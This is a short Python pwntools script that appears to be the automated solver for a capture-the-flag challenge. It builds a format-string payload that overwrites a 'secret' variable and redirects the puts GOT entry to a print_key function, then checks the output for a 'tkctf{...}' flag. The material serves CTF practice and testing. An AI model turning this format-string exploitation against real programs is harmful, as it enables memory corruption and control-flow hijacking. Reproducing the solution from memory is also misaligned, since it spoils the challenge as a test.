#!/usr/bin/env python3

import os
import re
import sys

from pwn import *

context.arch = "x86_64"
context.bits = 32

ROOT = os.path.abspath(os.path.dirname(__file__))

bin = os.path.join(ROOT, "../docker/target")
elf = ELF(bin)

secret = elf.symbols["secret"]
puts = elf.got["puts"]
print_key = elf.symbols["print_key"]

def exploit(p):
    writes = {secret: 0x111, puts: print_key}
    payload = b"BB" + fmtstr_payload(15, writes, 20, write_size="short")
    print("sizeof(payload) = %d" % len(payload))
    print(hexdump(payload))

    open("x", "wb").write(payload)

    p.sendline(payload)
    return p.readallS()

def parse_flag(out):
    m = re.search("(tkctf{[^}]+})", out)
    if m is None:
        return None
    return m.groups()[0]

if __name__ == '__main__':
    if "REMOTE" in os.environ:
        if not "PORT" in os.environ:
            print("[!] Please specify the port number")
            exit(1)
        p = remote("localhost", int(os.environ["PORT"]))
    else:
        b = os.path.abspath(bin)
        p = process(b, cwd=os.path.dirname(b))

    flag = parse_flag(exploit(p))
    if flag:
        print("Found: %s" % flag)
        print("OK!")
        exit(0)
    else:
        exit(1)

